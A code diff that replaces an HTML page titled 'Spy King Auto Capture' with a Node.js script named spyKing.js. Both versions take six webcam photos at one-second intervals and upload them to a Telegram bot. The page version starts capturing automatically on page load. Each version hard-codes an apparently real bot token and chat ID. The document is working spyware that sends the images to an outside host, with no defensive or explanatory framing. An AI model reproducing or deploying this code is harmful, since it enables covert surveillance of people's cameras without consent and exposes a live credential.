@@ -1,58 +1,55 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>Spy King Auto Capture</title>
-</head>
-<body>
-<h2>Spy King Auto Capture Experiment</h2>
+// spyKing.js
+const NodeWebcam = require("node-webcam");
+const fetch = require("node-fetch");
+const fs = require("fs");
 
-<script>
-const telegramBotToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70"; // Telegram bot token
-const chatId = "8182050140"; // Your chat ID
+// Telegram info
+const telegramBotToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
+const chatId = "8182050140";
 
-async function startCapture() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
+// Webcam options
+const opts = {
+    width: 640,
+    height: 480,
+    quality: 100,
+    saveShots: true,
+    output: "jpeg",
+    device: false,
+    callbackReturn: "location",
+    verbose: false
+};
 
-        // Capture 6 images at 1 sec interval
-        for (let i = 0; i < 6; i++) {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const dataUrl = canvas.toDataURL('image/jpeg');
+// Create webcam instance
+const Webcam = NodeWebcam.create(opts);
 
-            // Send to Telegram bot
-            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-                method: 'POST',
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    photo: dataUrl
-                }),
-                headers: {
-                    'Content-Type': 'application/json'
-                }
-            });
+// Function to send photo to Telegram
+async function sendPhoto(filePath) {
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("photo", fs.createReadStream(filePath));
 
-            await new Promise(r => setTimeout(r, 1000)); // 1 sec delay
-        }
+    const res = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+    });
 
-        // Stop stream
-        stream.getTracks().forEach(track => track.stop());
-        alert('Capture complete!');
+    console.log(await res.json());
+}
 
-    } catch (err) {
-        console.error(err);
-        alert('Camera access denied or error!');
+// Capture 6 images at 1 sec interval
+async function captureLoop() {
+    for (let i = 0; i < 6; i++) {
+        const fileName = `capture_${i}.jpg`;
+        NodeWebcam.capture(fileName, opts, async function(err, data) {
+            if (err) {
+                console.error(err);
+            } else {
+                console.log(`Captured ${fileName}`);
+                await sendPhoto(fileName);
+            }
+        });
+        await new Promise(r => setTimeout(r, 1000)); // 1 sec delay
     }
 }
 
-// Start capture automatically when page loads
-window.onload = startCapture;
-</script>
-</body>
-</html>
+captureLoop();
